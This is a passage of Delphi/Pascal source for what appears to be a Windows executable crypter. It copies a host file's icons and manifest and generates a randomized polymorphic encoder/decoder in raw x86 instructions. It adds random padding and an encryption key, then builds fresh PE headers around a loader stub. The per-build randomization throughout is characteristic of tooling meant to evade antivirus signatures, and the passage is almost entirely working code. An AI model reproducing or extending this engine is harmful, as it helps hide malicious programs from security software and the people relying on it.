  LDataEntry:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
  LPB:=RVA2RAW(Ptr,MainData,LDataEntry^.DataRVA);
  LIconGroup.GroupData.Size:=LDataEntry^.Size;
  LIconGroup.GroupData.DataRVA:=LResourceDataPtr;
  LIconGroup.GroupData.Codepage:=LDataEntry^.Codepage;

  CopyMemory(@LResourceData[LResourceDataPtr],LPB,LDataEntry^.Size);
  Inc(LResourceDataPtr,LDataEntry^.Size);

  LIconDirectory:=Pointer(LPB);
  LIconGroup.IconCount:=LIconDirectory^.Count;
  LIconGroup.NameDir.NumberOfIDEntries:=LIconGroup.IconCount;
  for LI:=0 to LIconDirectory^.Count-1 do
  begin
   LIconGroup.NameEntries[LI].NameID:=LIconDirectory^.Entries[LI].ID;
   LIconGroup.NameEntries[LI].SubdirDataRVA:=$80000000;
   LIconGroup.LangDirs[LI].Table.NumberOfIDEntries:=1;
   LIconGroup.LangDirs[LI].Directory.SubdirDataRVA:=$80000000;

   LIcoRes:=FindResource(LImage,MakeIntResource(LIconDirectory^.Entries[LI].ID),RT_ICON);
   LPB:=LockResource(LoadResource(LImage,LIcoRes));
   LSize:=SizeofResource(LImage,LIcoRes);
   LIconGroup.DataEntries[LI].Size:=LSize;
   LIconGroup.DataEntries[LI].DataRVA:=LResourceDataPtr;

   CopyMemory(@LResourceData[LResourceDataPtr],LPB,LSize);
   Inc(LResourceDataPtr,LSize);
  end;

  LSize:=6+LIconDirectory^.Count*SizeOf(TIconDirectoryEntry);
  CopyMemory(@LResourceData[LResourceDataPtr],LIconDirectory,LSize);
  Inc(LResourceDataPtr,LSize);
 end;

 if ResourceXPManifest<>nil then
 begin
  LPB:=Pointer(ResourceXPManifest);
  Inc(LPB,SizeOf(TResourceDirectoryTable));
  LNameEntry:=Pointer(LPB);
  LNameRVA:=LNameEntry^.NameID and $7FFFFFFF;
  LSubEntryRVA:=LNameEntry^.SubdirDataRVA and $7FFFFFFF;

  LXPManifest.NameDir.Table.NumberOfIDEntries:=1;
  LXPManifest.NameDir.Directory.NameID:=LNameRVA;
  LXPManifest.NameDir.Directory.SubdirDataRVA:=$80000000;

  LLangEntry:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
  LNameRVA:=LLangEntry^.Directory.NameID and $7FFFFFFF;
  LSubEntryRVA:=LLangEntry^.Directory.SubdirDataRVA and $7FFFFFFF;
  LXPManifest.LangDir.Table.NumberOfIDEntries:=1;
  LXPManifest.LangDir.Directory.NameID:=LNameRVA;
  LXPManifest.LangDir.Directory.SubdirDataRVA:=$80000000;

  LDataEntry:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
  LPB:=RVA2RAW(Ptr,MainData,LDataEntry^.DataRVA);
  LXPManifest.DataEntry.DataRVA:=LResourceDataPtr;
  LXPManifest.DataEntry.Size:=LDataEntry^.Size;
  LXPManifest.DataEntry.Codepage:=LDataEntry^.Codepage;

  CopyMemory(@LResourceData[LResourceDataPtr],LPB,LDataEntry^.Size);
  Inc(LResourceDataPtr,LDataEntry^.Size);
 end;

 LPB:=ResourceData;
 LManifestSize:=0;
 if ResourceXPManifest<>nil then LManifestSize:=2*SizeOf(TResourceTableDirectoryEntry);

 LSubEntryRVA:=SizeOf(LTypeTable.Directory) or $80000000;
 if ResourceIconGroup<>nil then Inc(LSubEntryRVA,SizeOf(LTypeTable.IconsEntry)+SizeOf(LTypeTable.IconGroupEntry));
 if ResourceXPManifest<>nil then Inc(LSubEntryRVA,SizeOf(LTypeTable.XPEntry));
 if ResourceIconGroup=nil then LTypeTable.XPEntry.SubdirDataRVA:=LSubEntryRVA
 else LTypeTable.IconsEntry.SubdirDataRVA:=LSubEntryRVA;
 LSize:=LSubEntryRVA and $7FFFFFFF;
 Inc(LPB,LSize);

 if ResourceIconGroup=nil then
 begin
  LResDataRVA:=LSubEntryRVA and $7FFFFFFF;
  Inc(LResDataRVA,SizeOf(LXPManifest.NameDir));
  Inc(LResDataRVA,SizeOf(LXPManifest.LangDir));
 end else
 begin
  LResStringsRVA:=LSubEntryRVA;
  Inc(LResStringsRVA,SizeOf(LIconGroup.NameDir));
  Inc(LResStringsRVA,LIconGroup.IconCount*SizeOf(TResourceDirectoryEntry));
  Inc(LResStringsRVA,LIconGroup.IconCount*SizeOf(TResourceTableDirectoryEntry));
  Inc(LResStringsRVA,SizeOf(LIconGroup.GroupNameDir));
  Inc(LResStringsRVA,SizeOf(LIconGroup.GroupLangDir));
  Inc(LResStringsRVA,LManifestSize);
  LResDataRVA:=LResStringsRVA and $7FFFFFFF+LResourceStringsPtr;

  //icons - name directory
  LSize:=SizeOf(LIconGroup.NameDir);
  Inc(LSubEntryRVA,LSize);
  CopyMemory(LPB,@LIconGroup.NameDir,LSize);
  Inc(LPB,LSize);

  //icons - name entries
  LSize:=LIconGroup.IconCount*SizeOf(TResourceDirectoryEntry);
  Inc(LSubEntryRVA,LSize);
  for LI:=0 to LIconGroup.IconCount-1 do
  begin
   LIconGroup.NameEntries[LI].SubdirDataRVA:=LSubEntryRVA;
   Inc(LSubEntryRVA,SizeOf(TResourceTableDirectoryEntry));
  end;
  CopyMemory(LPB,@LIconGroup.NameEntries,LSize);
  Inc(LPB,LSize);

  //icons - lang directory + entries
  LSize:=LIconGroup.IconCount*SizeOf(TResourceTableDirectoryEntry);
  for LI:=0 to LIconGroup.IconCount-1 do
  begin
   LIconGroup.LangDirs[LI].Directory.SubdirDataRVA:=LResDataRVA;
   Inc(LResDataRVA,SizeOf(TResourceDataEntry));
  end;
  CopyMemory(LPB,@LIconGroup.LangDirs,LSize);
  Inc(LPB,LSize);

  //icon group - name directory
  LTypeTable.IconGroupEntry.SubdirDataRVA:=LSubEntryRVA;
  LSize:=SizeOf(LIconGroup.GroupNameDir.Table);
  Inc(LSubEntryRVA,LSize);
  CopyMemory(LPB,@LIconGroup.GroupNameDir.Table,LSize);
  Inc(LPB,LSize);

  //icon group - name entry
  if LIconGroup.GroupNameDir.Directory.NameID and $80000000<>0 then
   LIconGroup.GroupNameDir.Directory.NameID:=LResStringsRVA or $80000000;

  LSize:=SizeOf(LIconGroup.GroupNameDir.Directory);
  Inc(LSubEntryRVA,LSize);
  LIconGroup.GroupNameDir.Directory.SubdirDataRVA:=LSubEntryRVA;
  CopyMemory(LPB,@LIconGroup.GroupNameDir.Directory,LSize);
  Inc(LPB,LSize);

  //icon group - lang directory + entry
  LIconGroup.GroupLangDir.Directory.SubdirDataRVA:=LResDataRVA;
  LSize:=SizeOf(LIconGroup.GroupLangDir);
  Inc(LSubEntryRVA,LSize);
  Inc(LResDataRVA,SizeOf(TResourceDataEntry));
  CopyMemory(LPB,@LIconGroup.GroupLangDir,LSize);
  Inc(LPB,LSize);
 end;

 if ResourceXPManifest<>nil then
 begin
  LTypeTable.XPEntry.SubdirDataRVA:=LSubEntryRVA;

  //manifest - name directory + entry
  LSize:=SizeOf(LXPManifest.NameDir);
  Inc(LSubEntryRVA,LSize);
  LXPManifest.NameDir.Directory.SubdirDataRVA:=LSubEntryRVA;
  CopyMemory(LPB,@LXPManifest.NameDir,LSize);
  Inc(LPB,LSize);

  //manifest - lang directory + entry
  LSize:=SizeOf(LXPManifest.LangDir);
  LXPManifest.LangDir.Directory.SubdirDataRVA:=LResDataRVA;
  Inc(LResDataRVA,SizeOf(TResourceDataEntry));
  CopyMemory(LPB,@LXPManifest.LangDir,LSize);
  Inc(LPB,LSize);
 end;

 //strings
 CopyMemory(LPB,@LResourceStrings,LResourceStringsPtr);
 Inc(LPB,LResourceStringsPtr);

 LResRawRVA:=LResDataRVA and $7FFFFFFF;

 if ResourceIconGroup<>nil then
 begin
  //icons - data
  LSize:=SizeOf(TResourceDataEntry)*LIconGroup.IconCount;
  for LI:=0 to LIconGroup.IconCount-1 do
   Inc(LIconGroup.DataEntries[LI].DataRVA,LResRawRVA+ResourceSection.VirtualAddress);
  CopyMemory(LPB,@LIconGroup.DataEntries,LSize);
  Inc(LPB,LSize);

  //icon group - data
  LSize:=SizeOf(LIconGroup.GroupData);
  Inc(LIconGroup.GroupData.DataRVA,LResRawRVA+ResourceSection.VirtualAddress);
  CopyMemory(LPB,@LIconGroup.GroupData,LSize);
  Inc(LPB,LSize);
 end;

 if ResourceXPManifest<>nil then
 begin
  //manifest - data
  LSize:=SizeOf(LXPManifest.DataEntry);
  Inc(LXPManifest.DataEntry.DataRVA,LResRawRVA+ResourceSection.VirtualAddress);
  CopyMemory(LPB,@LXPManifest.DataEntry,LSize);
  Inc(LPB,LSize);
 end;

 CopyMemory(LPB,@LResourceData,LResourceDataPtr);
 Inc(LPB,LResourceDataPtr);
 ResourceSectionSize:=Cardinal(LPB)-Cardinal(ResourceData);

 LPB:=ResourceData;
 CopyMemory(LPB,@LTypeTable,SizeOf(LTypeTable.Directory));
 Inc(LPB,SizeOf(LTypeTable.Directory));
 if ResourceIconGroup<>nil then
 begin
  CopyMemory(LPB,@LTypeTable.IconsEntry,SizeOf(LTypeTable.IconsEntry));
  Inc(LPB,SizeOf(LTypeTable.IconsEntry));
  CopyMemory(LPB,@LTypeTable.IconGroupEntry,SizeOf(LTypeTable.IconGroupEntry));
  Inc(LPB,SizeOf(LTypeTable.IconGroupEntry));
 end;
 if ResourceXPManifest<>nil then
  CopyMemory(LPB,@LTypeTable.XPEntry,SizeOf(LTypeTable.XPEntry));

 FreeLibrary(LImage);
end;

function GenerateEncoderDecoder(AHostSize:Cardinal;out OEncoder,ODecoder:Pointer):Cardinal;
//generate encoder and decoder for the host file
//returns size of decoder
const
 CI_XOR         = 00;
 CI_ADD         = 01;
 CI_SUB         = 02;
 CI_ROR         = 03;
 CI_ROL         = 04;
 CI_NOT         = 05;
 CI_NEG         = 06;
 CI_BSWAP       = 07;
 CI_XOR_OFS     = 08;
 CI_ADD_OFS     = 09;
 CI_SUB_OFS     = 10;
 CI_XOR_SMH     = 11;
 CI_ADD_SMH     = 12;
 CI_SUB_SMH     = 13;
 CI_SMH_ADD     = 14;
 CI_SMH_SUB     = 15;
 CI_MAX         = 16;

type
 TCoderInstruction=packed record
  IType,ILen:Byte;
  IArg1,IArg2,IArg3:Cardinal;
 end;
 TCoderContext=record
  DataSizeRegister:Byte;
  DataAddrRegister:Byte;
  DataRegister:Byte;
  OffsetRegister:Byte;
  SmashRegister:Byte;
  FreeRegister:Byte;
 end;

 TCoder=array[0..255] of TCoderInstruction;

var
 LCoderContext:TCoderContext;
 LEncoder,LDecoder:TCoder;
 LEncoderData,LDecoderData:array[0..511] of Char;
 LInstrCount,LReg:Byte;
 LI,LNotUsed:Integer;
 LRegUsed:array[0..Reg32Count-1] of Boolean;
 LPB,LPB2:PByte;
 LEncSize,LDecSize,LSmashNum:Cardinal;

 procedure GenerateCoderInstruction(ACoder:TCoder;AInstr:Integer);
 begin
  case ACoder[LI].IType of
   CI_XOR:XorReg32Num32(LPB,LCoderContext.DataRegister,ACoder[LI].IArg1);
   CI_ADD:AddReg32Num32(LPB,LCoderContext.DataRegister,ACoder[LI].IArg1);
   CI_SUB:SubReg32Num32(LPB,LCoderContext.DataRegister,ACoder[LI].IArg1);
   CI_ROR:RorReg32Num8(LPB,LCoderContext.DataRegister,ACoder[LI].IArg1);
   CI_ROL:RolReg32Num8(LPB,LCoderContext.DataRegister,ACoder[LI].IArg1);
   CI_NOT:NotReg32(LPB,LCoderContext.DataRegister);
   CI_NEG:NegReg32(LPB,LCoderContext.DataRegister);
   CI_BSWAP:Bswap(LPB,LCoderContext.DataRegister);
   CI_XOR_OFS:XorReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
   CI_ADD_OFS:AddReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
   CI_SUB_OFS:SubReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.OffsetRegister);
   CI_XOR_SMH:XorReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
   CI_ADD_SMH:AddReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
   CI_SUB_SMH:SubReg32Reg32(LPB,LCoderContext.DataRegister,LCoderContext.SmashRegister);
   CI_SMH_ADD:AddReg32Num32(LPB,LCoderContext.SmashRegister,ACoder[LI].IArg1);
   CI_SMH_SUB:SubReg32Num32(LPB,LCoderContext.SmashRegister,ACoder[LI].IArg1);
  end;
 end;

begin
 LInstrCount:=Random(32)+16;                     //number of instructions in encoder/decoder
 LSmashNum:=Cardinal(Random($FFFFFFFF));

 //at first generate coder context
 for LI:=0 to Reg32Count-1 do LRegUsed[LI]:=False;
 LRegUsed[REG_ESP]:=True;
 LRegUsed[REG_EBP]:=True;
 LNotUsed:=Reg32Count-2;
 while LNotUsed>0 do
 begin
  LReg:=Random(Reg32Count);
  while LRegUsed[LReg] do LReg:=(LReg+1) mod Reg32Count;
  LRegUsed[LReg]:=True;

  with LCoderContext do
  case LNotUsed of
   1:DataSizeRegister:=LReg;
   2:DataAddrRegister:=LReg;
   3:DataRegister:=LReg;
   4:OffsetRegister:=LReg;
   5:SmashRegister:=LReg;
   6:FreeRegister:=LReg;
  end;
  Dec(LNotUsed);
 end;

 //generate encoder/decoder
 for LI:=0 to LInstrCount-1 do
 begin
  LEncoder[LI].IType:=Random(CI_MAX);
  case LEncoder[LI].IType of
   CI_XOR:begin
    //DataRegister = DataRegister xor IArg1
    LEncoder[LI].IArg1:=Cardinal(Random($FFFFFFFF));
    LDecoder[LI].IType:=CI_XOR;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_ADD:begin
    //DataRegister = DataRegister + IArg1
    LEncoder[LI].IArg1:=Cardinal(Random($FFFFFFFF));
    //DataRegister = DataRegister - IArg1
    LDecoder[LI].IType:=CI_SUB;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_SUB:begin
    //DataRegister = DataRegister - IArg1
    LEncoder[LI].IArg1:=Cardinal(Random($FFFFFFFF));
    //DataRegister = DataRegister + IArg1
    LDecoder[LI].IType:=CI_ADD;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_ROR:begin
    //DataRegister = DataRegister ror IArg1
    LEncoder[LI].IArg1:=Random($100);
    //DataRegister = DataRegister rol IArg1
    LDecoder[LI].IType:=CI_ROL;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_ROL:begin
    //DataRegister = DataRegister rol IArg1
    LEncoder[LI].IArg1:=Random($100);
    //DataRegister = DataRegister ror IArg1
    LDecoder[LI].IType:=CI_ROR;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_NOT:begin
    //DataRegister = not DataRegister
    LDecoder[LI].IType:=CI_NOT;
   end;

   CI_NEG:begin
    //DataRegister = -DataRegister
    LDecoder[LI].IType:=CI_NEG;
   end;

   CI_BSWAP:begin
    //DataRegister = swaped DataRegister
    LDecoder[LI].IType:=CI_BSWAP;
   end;

   CI_XOR_OFS:begin
    //DataRegister = DataRegister xor OffsetRegister
    LDecoder[LI].IType:=CI_XOR_OFS;
   end;

   CI_ADD_OFS:begin
    //DataRegister = DataRegister + OffsetRegister
    //DataRegister = DataRegister - OffsetRegister
    LDecoder[LI].IType:=CI_SUB_OFS;
   end;

   CI_SUB_OFS:begin
    //DataRegister = DataRegister + OffsetRegister
    //DataRegister = DataRegister - OffsetRegister
    LDecoder[LI].IType:=CI_ADD_OFS;
   end;

   CI_XOR_SMH:begin
    //DataRegister = DataRegister xor SmashRegister
    LDecoder[LI].IType:=CI_XOR_SMH;
   end;

   CI_ADD_SMH:begin
    //DataRegister = DataRegister + SmashRegister
    //DataRegister = DataRegister - SmashRegister
    LDecoder[LI].IType:=CI_SUB_SMH;
   end;

   CI_SUB_SMH:begin
    //DataRegister = DataRegister + SmashRegister
    //DataRegister = DataRegister - SmashRegister
    LDecoder[LI].IType:=CI_ADD_SMH;
   end;

   CI_SMH_ADD:begin
    //SmashRegister = SmashRegister + IArg1
    LEncoder[LI].IArg1:=Cardinal(Random($FFFFFFFF));
    //SmashRegister = SmashRegister - IArg1
    LDecoder[LI].IType:=CI_SMH_SUB;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;

   CI_SMH_SUB:begin
    //SmashRegister = SmashRegister - IArg1
    LEncoder[LI].IArg1:=Cardinal(Random($FFFFFFFF));
    //SmashRegister = SmashRegister + IArg1
    LDecoder[LI].IType:=CI_SMH_ADD;
    LDecoder[LI].IArg1:=LEncoder[LI].IArg1;
   end;
  end;
 end;


 LPB:=@LEncoderData;
 //stub
 PushReg32(LPB,REG_EBX);
 PushReg32(LPB,REG_ESI);
 PushReg32(LPB,REG_EDI);
 MovReg32RegMemIdx8(LPB,LCoderContext.DataAddrRegister,REG_ESP,$10);
 MovReg32Num32(LPB,LCoderContext.DataSizeRegister,AHostSize);
 XorReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.OffsetRegister);
 MovReg32Num32(LPB,LCoderContext.SmashRegister,LSmashNum);
 //main cycle
 LPB2:=LPB;
 //load data
 MovReg32RegMem(LPB,LCoderContext.DataRegister,LCoderContext.DataAddrRegister);
 //generate encoder instructions
 for LI:=0 to LInstrCount-1 do
  GenerateCoderInstruction(LEncoder,LI);
 //store data
 MovRegMemReg32(LPB,LCoderContext.DataAddrRegister,LCoderContext.DataRegister);
 //inc data ptr
 AddReg32Num8(LPB,LCoderContext.DataAddrRegister,4);
 //inc offset
 AddReg32Num8(LPB,LCoderContext.OffsetRegister,4);
 //end of data?
 CmpReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.DataSizeRegister);
 RelJnzAddr32(LPB,Cardinal(-((Cardinal(LPB)+6)-Cardinal(LPB2))));
 //ret
 MovReg32Reg32(LPB,REG_EAX,LCoderContext.SmashRegister);
 PopReg32(LPB,REG_EDI);
 PopReg32(LPB,REG_ESI);
 PopReg32(LPB,REG_EBX);
 Ret16(LPB,4);

 LEncSize:=Cardinal(LPB)-Cardinal(@LEncoderData);
 OEncoder:=MyAlloc(LEncSize);
 if OEncoder=nil then
 begin
  Result:=0;
  Exit;
 end;
 CopyMemory(OEncoder,@LEncoderData,LEncSize);

 EncoderProc:=OEncoder;
 LSmashNum:=EncoderProc(MainDataCyp);

 LPB:=@LDecoderData;
 //stub
 PopReg32(LPB,LCoderContext.DataAddrRegister);
 AddReg32Num32(LPB,LCoderContext.DataAddrRegister,AHostSize);
 MovReg32Num32(LPB,LCoderContext.DataSizeRegister,AHostSize);
 MovReg32Num32(LPB,LCoderContext.OffsetRegister,AHostSize);
 MovReg32Num32(LPB,LCoderContext.SmashRegister,LSmashNum);
 //main cycle
 LPB2:=LPB;
 //dec offset
 SubReg32Num8(LPB,LCoderContext.OffsetRegister,4);
 //dec data ptr
 SubReg32Num8(LPB,LCoderContext.DataAddrRegister,4);
 //load data
 MovReg32RegMem(LPB,LCoderContext.DataRegister,LCoderContext.DataAddrRegister);
 //generate decoder instructions
 for LI:=LInstrCount-1 downto 0 do
  GenerateCoderInstruction(LDecoder,LI);
 //store data
 MovRegMemReg32(LPB,LCoderContext.DataAddrRegister,LCoderContext.DataRegister);
 //end of data?
 TestReg32Reg32(LPB,LCoderContext.OffsetRegister,LCoderContext.OffsetRegister);
 RelJnzAddr32(LPB,Cardinal(-((Cardinal(LPB)+6)-Cardinal(LPB2))));

 LDecSize:=Cardinal(LPB)-Cardinal(@LDecoderData);

 ODecoder:=MyAlloc(LDecSize);
 if ODecoder=nil then
 begin
  MyFree(OEncoder);
  OEncoder:=nil;
  Result:=0;
 end else
 begin
  CopyMemory(ODecoder,@LDecoderData,LDecSize);
  Result:=LDecSize;
 end;
end;

procedure FindAfterImageOverlays;
//look for overlay data in MainData written at the end of original file
//fills AfterImageOverlays pointer its size - AfterImageOverlaysSize
var
 LI:Integer;
 LPSection:PImageSectionHeader;
 LMaxAddr,LDataSize:Cardinal;
 LHdr:PImageNtHeaders;

begin
 AfterImageOverlays:=nil;
 AfterImageOverlaysSize:=0;
 LMaxAddr:=0;
 LHdr:=Pointer(Cardinal(MainData)+Cardinal(PImageDosHeader(MainData)^._lfanew));
 LPSection:=Pointer(Cardinal(@LHdr^.OptionalHeader)+LHdr^.FileHeader.SizeOfOptionalHeader);

 for LI:=0 to LHdr^.FileHeader.NumberOfSections-1 do
 begin
  LDataSize:=RoundSize(LPSection^.SizeOfRawData,RawDataAlignment);
  if LPSection^.PointerToRawData+LDataSize>LMaxAddr then LMaxAddr:=LPSection^.PointerToRawData+LDataSize;
  Inc(LPSection);
 end;
 if (LMaxAddr>0) and (LMaxAddr<MainRealSize) then
 begin
  AfterImageOverlays:=Pointer(Cardinal(MainData)+LMaxAddr);
  AfterImageOverlaysSize:=MainRealSize-LMaxAddr;
 end;
end;


begin
 if not ProcessCmdLine then Usage;
 if not Quiet then About;

 Randomize;                             //very important for this prog :)
 MainFile:=CreateFile(PChar(InputFileName),GENERIC_READ,FILE_SHARE_READ,nil,OPEN_EXISTING,0,0);
 if MainFile<>INVALID_HANDLE_VALUE then
 begin
  MainRealSize:=GetFileSize(MainFile,nil);
  if not Quiet then WriteLn('InputFile: ',InputFileName,' (',MainRealSize,')');

  MainRealSize4:=MainRealSize;
  if MainRealSize4 mod 4<>0 then Inc(MainRealSize4,4-MainRealSize4 mod 4);

  MainSize:=MainRealSize+Cardinal(Random(100)+10);
  MainData:=MyAlloc(MainSize);
  MainDataCyp:=MyAlloc(MainSize);
  if (MainData<>nil) and (MainDataCyp<>nil) then
  begin
   GenerateRandomBuffer(MainData,MainSize);
   ZeroMemory(MainData,MainRealSize4);
   if ReadFile(MainFile,MainData^,MainRealSize,NumBytes,nil) then
   begin
    CloseHandle(MainFile);
    MainFile:=INVALID_HANDLE_VALUE;
    CopyMemory(MainDataCyp,MainData,MainSize);
    if CheckPEFile(MainData) then
    begin
     Ptr:=Pointer(Cardinal(MainData)+Cardinal(PImageDosHeader(MainData)^._lfanew));

     ImageType:=itExe;
     HostCharacteristics:=PImageNtHeaders(Ptr)^.FileHeader.Characteristics;
     if HostCharacteristics and IMAGE_FILE_DLL<>0 then ImageType:=itDLL;
     HostExportSectionVirtualAddress:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

     HostImageBase:=PImageNtHeaders(Ptr)^.OptionalHeader.ImageBase;
     HostSubsystem:=PImageNtHeaders(Ptr)^.OptionalHeader.Subsystem;
     HostSizeOfImage:=PImageNtHeaders(Ptr)^.OptionalHeader.SizeOfImage;
     HostImportSectionSize:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
     HostImportSectionVirtualAddress:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

     HostResourceSectionVirtualAddress:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;

     if (HostSubsystem=IMAGE_SUBSYSTEM_WINDOWS_GUI) or (HostSubsystem=IMAGE_SUBSYSTEM_WINDOWS_CUI) then
     begin
      FindAfterImageOverlays;
      if not Quiet then
      begin
       WriteLn;
       Write('ImageType: ');
       case ImageType of
        itExe:WriteLn('Executable');
        itDLL:WriteLn('Dynamic Linking Library');
        itSys:WriteLn('System Driver');
        else WriteLn('unknown');
       end;
       Write('Subsystem: ');
       if (HostSubSystem=IMAGE_SUBSYSTEM_WINDOWS_GUI) then WriteLn('Windows GUI')
       else WriteLn('Windows character');
      end;

      TlsSectionSize:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].Size;
      TlsSectionPresent:=TlsSectionSize<>0;

      ExportSectionPresent:=False;
      ExportSectionSize:=0;
      ExportData:=nil;
      if ImageType=itDLL then
      begin
       ExportSectionSize:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
       ExportSectionPresent:=ExportSectionSize<>0;
      end;

      ResourceSectionPresent:=False;
      HostResourceSectionSize:=0;
      ResourceData:=nil;
      if (ImageType=itExe) or (ImageType=itDLL) then
      begin
       HostResourceSectionSize:=PImageNtHeaders(Ptr)^.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;
       ResourceSectionPresent:=HostResourceSectionSize<>0;
      end;

      OverlayPresent:=(AfterImageOverlays<>nil) and (AfterImageOverlaysSize>0);

      if not Quiet then
      begin
       if TlsSectionPresent then
       begin
        WriteLn('.tls section is present');
        WriteLn('original .tls section size: ',TlsSectionSize);
       end else WriteLn('.tls section not present');

       if ExportSectionPresent then
       begin
        if not DynamicDLL then
        begin
         WriteLn('export section is present');
         WriteLn('original export section size: ',ExportSectionSize);
        end else WriteLn('Dynamic DLL - export section not used');
       end else WriteLn('export section not present');

       if ResourceSectionPresent then
       begin
        if SaveIcon then WriteLn('resource section present')
        else WriteLn('resource section present but not used');
       end else WriteLn('resource section not present');

       if OverlayPresent then
       begin
        if SaveOverlay then WriteLn('overlay data present')
        else WriteLn('overlay data present but not used');
       end else WriteLn('overlay data not present');
      end;
      if DynamicDLL then ExportSectionPresent:=False;
      if not SaveIcon then ResourceSectionPresent:=False;
      if not SaveOverlay then OverlayPresent:=False;

      if ResourceSectionPresent then
      begin
       ResourceRoot:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress);
       ResourceDirEntry:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+SizeOf(TResourceDirectoryTable));
       ResourceIconGroup:=nil;
       ResourceXPManifest:=nil;
       for I:=0 to ResourceRoot^.NumberOfIDEntries+ResourceRoot^.NumberOfNameEntries-1 do
       begin
        if (ResourceIconGroup=nil) and (ResourceDirEntry^.NameID=Cardinal(RT_GROUP_ICON)) then
          ResourceIconGroup:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+ResourceDirEntry^.SubdirDataRVA and $7FFFFFFF);

        if (ResourceXPManifest=nil) and (ResourceDirEntry^.NameID=Cardinal(RT_XP_MANIFEST)) then
          ResourceXPManifest:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+ResourceDirEntry^.SubdirDataRVA and $7FFFFFFF);

        if not ((ResourceIconGroup=nil) or (ResourceXPManifest=nil)) then Break;
        Inc(ResourceDirEntry);
       end;

       if not ((ResourceIconGroup=nil) and (ResourceXPManifest=nil)) then
       begin
        ResourceData:=MyAlloc(HostResourceSectionSize);
        if ResourceData=nil then
        begin
         ErrorMsg('Unable to allocate memore for resource data');
         ResourceSectionPresent:=False;
        end;
       end else ResourceSectionPresent:=False;
       if not ResourceSectionPresent then
        if not Quiet then WriteLn('resource section has no icon or XP manifest');
      end;

      MainDataDecoderLen:=GenerateEncoderDecoder(MainRealSize4,MainDataEncoder,MainDataDecoder);
      if MainDataDecoderLen<>0 then
      begin
       LoaderRealSize:=Cardinal(@DynLoader_end)-Cardinal(@DynLoader);
       LoaderSize:=LoaderRealSize+MainDataDecoderLen+Cardinal(Random(100))+4;
       if LoaderSize mod 4>0 then Inc(LoaderSize,4-LoaderSize mod 4);
       if not Quiet then
       begin
        WriteLn;
        WriteLn('Loader size: ',LoaderSize);
       end;

       LoaderData:=MyAlloc(LoaderSize);
       if LoaderData<>nil then
       begin
        GenerateRandomBuffer(LoaderData,LoaderSize);
        CopyMemory(LoaderData,@DynLoader,LoaderRealSize);

        MainDataDecPtr:=LoaderData;
        while PCardinal(MainDataDecPtr)^<>DYN_LOADER_DEC_MAGIC do Inc(MainDataDecPtr);
        DynLoaderDecoderOffset:=Cardinal(MainDataDecPtr)-Cardinal(LoaderData);
        CopyMemory(Pointer(Cardinal(MainDataDecPtr)+MainDataDecoderLen),Pointer(Cardinal(@DynLoader)+DynLoaderDecoderOffset+4),LoaderRealSize-DynLoaderDecoderOffset);
        CopyMemory(MainDataDecPtr,MainDataDecoder,MainDataDecoderLen);

        KeySize:=Random(200)+50;
        KeyPtr:=Random(200);
        LoaderPtr:=KeyPtr+KeySize;
        Trash2Size:=Random(256)+20;
 
        if not Quiet then WriteLn('Encryption key size: ',KeySize);
        Key:=MyAlloc(KeySize);
        if Key<>nil then
        begin
         GenerateKey(Key,KeySize);
 
         ZeroMemory(@DosHeader,SizeOf(DosHeader));
         ZeroMemory(@NtHeaders,SizeOf(NtHeaders));
         ZeroMemory(@DosStubEnd,SizeOf(DosStubEnd));
         if not Quiet then
         begin
          WriteLn;
          WriteLn('Building DOS header ...');
         end;
         DosHeader.e_magic:=PWord(PChar('MZ'))^;
         DosHeader.e_cblp:=$0050;
         DosHeader.e_cp:=$0002;
         DosHeader.e_cparhdr:=$0004;
         DosHeader.e_minalloc:=$000F;
         DosHeader.e_maxalloc:=$FFFF;
         DosHeader.e_sp:=$00B8;
         DosHeader.e_lfarlc:=$0040;
         DosHeader.e_ovno:=$001A;
         DosHeader._lfanew:=$0100;

         if not Quiet then WriteLn('Building NT headers ...');
         NtHeaders.Signature:=PCardinal(PChar('PE'))^;
         NtHeaders.FileHeader.Machine:=IMAGE_FILE_MACHINE_I386;
         NtHeaders.FileHeader.NumberOfSections:=2;
         if TlsSectionPresent then Inc(NtHeaders.FileHeader.NumberOfSections);
         if ExportSectionPresent then Inc(NtHeaders.FileHeader.NumberOfSections);
         if ResourceSectionPresent then Inc(NtHeaders.FileHeader.NumberOfSections);
         if not Quiet then WriteLn('Number of sections: ',NtHeaders.FileHeader.NumberOfSections);
